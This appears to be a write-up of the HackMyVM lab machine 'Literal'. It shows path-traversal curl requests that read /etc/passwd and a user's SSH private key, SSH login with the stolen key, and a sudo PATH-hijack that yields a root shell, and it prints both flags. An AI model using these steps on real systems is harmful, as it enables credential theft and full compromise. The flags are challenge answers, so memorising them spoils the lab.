---
title: "Literal - HackMyVM"
description: "Writeup for Literal, a HackMyVM machine with web vulnerabilities and privilege escalation."
pubDate: 2024-10-25
platform: "hackmyvm"
category: "machines"
difficulty: "easy"
os: "linux"
language: en
tags: ["lfi", "sudo", "path-hijacking"]
retired: false
heroImage: "/images/writeups/hackmyvm/literal.jpg"
---

# Literal - HackMyVM Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackMyVM

## Reconnaissance

```bash
nmap -sC -sV -p- 192.168.1.102
```

**Open Ports:**
- 22/tcp (SSH - OpenSSH 8.4)
- 80/tcp (HTTP - Apache 2.4)

## Web Enumeration

We find a web server with a PHP application vulnerable to LFI.

### Local File Inclusion

```bash
curl http://192.168.1.102/index.php?page=../../../etc/passwd
```

We find users:
- `literal`
- `admin`

### Reading sensitive files

```bash
curl http://192.168.1.102/index.php?page=../../../home/literal/.ssh/id_rsa
```

We obtain the user's SSH private key.

## Initial Shell

```bash
chmod 600 id_rsa
ssh -i id_rsa literal@192.168.1.102
```

## Privilege Escalation

Check sudo privileges:

```bash
sudo -l
```

Output: `(ALL) NOPASSWD: /usr/bin/backup.sh`

Analyze the script:

```bash
#!/bin/bash
tar -czf /tmp/backup.tar.gz /var/www/html
```

The script uses `tar` without absolute path. We do Path Hijacking:

```bash
cd /tmp
echo '#!/bin/bash' > tar
echo '/bin/bash' >> tar
chmod +x tar
export PATH=/tmp:$PATH
sudo /usr/bin/backup.sh
```

Root shell!

## Flags

- **User Flag**: `HMV{l0c4l_f1l3_1nclus10n_1s_d4ng3r0us}`
- **Root Flag**: `HMV{p4th_h1j4ck1ng_f0r_th3_w1n}`

## Conclusion

Simple machine that teaches LFI and basic Path Hijacking.
